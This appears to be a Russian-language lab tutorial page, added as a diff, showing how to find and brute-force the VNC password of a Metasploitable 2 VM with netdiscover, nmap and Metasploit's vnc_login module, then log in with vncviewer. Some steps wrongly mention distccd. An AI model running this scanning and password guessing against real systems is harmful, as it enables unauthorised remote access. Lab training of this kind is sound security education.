@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Эксплуатация уязвимости VNC (Virtual Network Computing) в metasploitable-linux-2.0.0</title>
+
+	<meta name="DESCRIPTION" content="Эксплуатация уязвимости VNC (Virtual Network Computing) в metasploitable-linux-2.0.0">
+	<meta name="KEYWORDS" content="Эксплуатация уязвимости VNC (Virtual Network Computing) в metasploitable-linux-2.0.0">
+
+  <meta property="og:url"                content="https://ed-kurlyak.github.io/08.004-metasp2/metasp2p.html" />
+  <meta property="og:type"               content="article" />
+  <meta property="og:title"              content="Ed Kurlyak - Эксплуатация уязвимости VNC (Virtual Network Computing) в metasploitable-linux-2.0.0" />
+  <meta property="og:description"        content="Эксплуатация уязвимости VNC (Virtual Network Computing) в metasploitable-linux-2.0.0" />
+  <meta property="og:image"              content="https://ed-kurlyak.github.io/08.004-metasp2/metasp2.png" />
+
+<style type="text/css">
+body {
+	font-size: 24px;
+	font-family: "Consolas";
+	background-color: #000;
+	color: #ffffff;
+}
+
+pre {
+	font-size: 24px;
+	font-family: "Consolas";
+	background-color: #ffffaa;
+	color: #000;
+	width: max-content;
+	min-width: 100%;
+
+}
+
+div.my_selected {
+	width: 100%;
+	background-color: #ffff55;
+	position: relative;
+}
+
+a:link, a:visited { color: #aaaaaa; text-decoration: none; font-weight: normal;} 
+a:active, a:hover { color: #aaaaaa; text-decoration: underline;}
+
+p {
+	text-align: justify;
+	margin-right: 20px;
+}
+
+</style>	
+</head>
+<body>
+
+<h3>
+Часть 17. Эксплуатация уязвимости VNC (Virtual Network Computing) в metasploitable-linux-2.0.0
+</h3>
+
+<p>
+Предполагается что все действия выполняются на виртуальных машинах VirtualBox.
+</p>
+
+
+<p>
+Начинаем атаку на удаленную машину Metasploitable 2.
+</p>
+
+
+<p>
+Необходимо определить IP с машиной Metasploitable 2. Для этого сначала определим наш IP и маску подсети, для этого дадим команду в терминале Kali:
+</p>
+
+<p>
+ifconfig
+</p>
+
+<p>
+В результатах вывода команды выше, можно увидеть такую строку:
+</p>
+
+<p>
+inet 10.0.2.4  netmask 255.255.255.0 
+</p>
+
+<p>
+То есть наш IP 10.0.2.4 а диапазон IP адресов нашей сети 10.0.2.0/24 (это обяснялось ранее в предыдущих статьях).
+</p>
+
+<p>
+Для обнаружения других компьютеров в сети и в том числе нашей удаленной машины Metasploitable 2, дадим команду в терминале Kali:
+</p>
+
+<p>
+sudo netdiscover -r 10.0.2.0/24
+</p>
+
+<p>
+В выводе команды:
+</p>
+
+<p>
+10.0.2.2        08:00:27:3a:17:ed      1      60  PCS Systemtechnik GmbH
+10.0.2.3        08:00:27:f1:18:5a      1      60  PCS Systemtechnik GmbH
+</p>
+
+<p>
+10.0.2.2 - это виртуальный роутер, который управляет нашей сетью.
+</p>
+
+<p>
+10.0.2.3 - это наша машина (по логике) с Metasploitable 2.
+</p>
+
+<p>
+Проверим связь между нашей Kali и удаленной ВМ Metasploitable 2, дадим команду:
+</p>
+
+<p>
+ping 10.0.2.3
+</p>
+
+<p>
+Если сеть в VirtualBox настроена правильно, видим пинг идет, связь есть.
+</p>
+
+<p>
+На Kali выполняем команду в терминале что бы найти distccd:
+</p>
+
+<p>
+nmap -sC -sV 10.0.2.3
+</p>
+
+<p>
+В выводе nmap находим такую строку (сриншот ниже):
+</p>
+
+<p>
+5900/tcp open  vnc         VNC (protocol 3.3)
+</p>
+
+<p>
+Это значит на порту 5900 открыта служба VNC (скриншот ниже).
+</p>
+
+<img src="./picq/pic126.jpg" width=1400 alt="kali linux терминал вывод команды nmap">
+
+<p>
+Запускаем консоль метсплоит:
+</p>
+
+<p>
+msfconsole
+</p>
+
+<p>
+После запуска метасплоит даем команду поиска distccd:
+</p>
+
+<p>
+msf > search vnc
+<br>
+msf > use auxiliary/scanner/vnc/vnc_login
+<br>
+msf auxiliary(scanner/vnc/vnc_login) > set RHOSTS 10.0.2.3
+<br>
+msf auxiliary(scanner/vnc/vnc_login) > run
+</p>
+
+<p>
+Как видим на скриншоте ниже, пароль успешно подобран, и пароль слово - password (скриншот ниже).
+</p>
+
+<p>
+После подбора пароля в метасплоит даем команду выхода exit.
+</p>
+
+<img src="./picq/pic127.jpg" width=1400 alt="kali linux терминал msfconsole команды search use set rhosts run">
+
+
+<p>
+Мы успешно подобрали пароль сканером, теперь можем сделать вход в удаленную систему, дать команду в терминале Kali:
+</p>
+
+vncviewer 10.0.2.3
+
+<p>
+На запрос пароля вводим слово:
+</p>
+
+<p>
+password
+</p>
+
+<img src="./picq/pic128.jpg" width=1400 alt="kali linux терминал команда vncviewer">
+
+<p>
+И видим (скриншот ниже) мы успешно вошли в Metasploitable 2.
+</p>
+
+<img src="./picq/pic129.jpg" width=1400 alt="kali linux терминал metasploitable 2 vnc">
+
+<p>
+Например далее дадим команду ifconfig, и получим IP 10.0.2.3 - что указывает на Metasploitable 2.
+</p>
+
+<img src="./picq/pic130.jpg" width=1400 alt="kali linux терминал metasploitable 2 vnc команда ifconfig">
+
+
+<p>
+Это пример проверки VNC-сервера на наличие слабого пароля в рамках тестирования безопасности (например, на своей машине или в лаборатории).
+</p>
+
+<p>
+Что такое VNC?
+</p>
+
+<p>
+VNC (Virtual Network Computing) — это система удаленного управления компьютером.
+</p>
+
+<p>
+Она позволяет видеть рабочий стол удаленного компьютера и управлять мышью и клавиатурой.
+</p>
+
+<p>
+Стандартный порт VNC:
+</p>
+
+<p>
+5900/TCP — первый дисплей
+<br>
+5901 — второй
+<br>
+5902 — третий и т.д.
+</p>
+
+<p>
+Что такое auxiliary?
+</p>
+
+<p>
+В Metasploit есть несколько типов модулей.
+</p>
+
+<p>
+auxiliary — это вспомогательные модули.
+</p>
+
+<p>
+Они не выполняют эксплуатацию уязвимости.
+</p>
+
+<p>
+Они могут:
+</p>
+
+<p>
+сканировать сеть;
+<br>
+подбирать пароли;
+<br>
+собирать информацию;
+<br>
+проверять сервисы.
+</p>
+
+<p>
+То есть этот модуль предназначен только для проверки аутентификации VNC.
+</p>
+
+<p>
+После запуска модуль начинает проверять возможность входа.
+</p>
+
+<p>
+Обычно он:
+</p>
+
+<p>
+подключается к VNC; пытается выполнить аутентификацию с использованием словаря паролей или заданного пароля;
+если вход успешен — сообщает найденный пароль.
+</p>
+
+<p>
+Например:
+</p>
+
+<p>
+[+] 192.168.79.179:5900 - Login Successful: password
+</p>
+
+<p>
+Подключение через VNC-клиент
+</p>
+
+<p>
+vncviewer 192.168.79.179
+</p>
+
+<p>
+vncviewer — это программа-клиент VNC.
+</p>
+
+<p>
+Она подключается к серверу.
+</p>
+
+<p>
+Общая схема процесса
+</p>
+
+<pre>
+
+Компьютер A
+      │
+      │  сканирование
+      ▼
+Обнаружен порт 5900
+      │
+      ▼
+Запускается модуль vnc_login
+      │
+      ▼
+Проверяется возможность входа
+      │
+      ▼
+Пароль найден
+      │
+      ▼
+Запускается VNC Viewer
+      │
+      ▼
+Вводится пароль
+      │
+      ▼
+При успешной аутентификации открывается удаленный рабочий стол
+
+</pre>
+
+<p>
+Во многих старых или неправильно настроенных системах VNC мог использовать слабые или стандартные пароли. Поэтому при аудите безопасности проверяют, насколько надежно защищен VNC-сервер, чтобы убедиться, что неавторизованные пользователи не смогут получить удаленный доступ.
+</p>
+
+</body>
+</html>
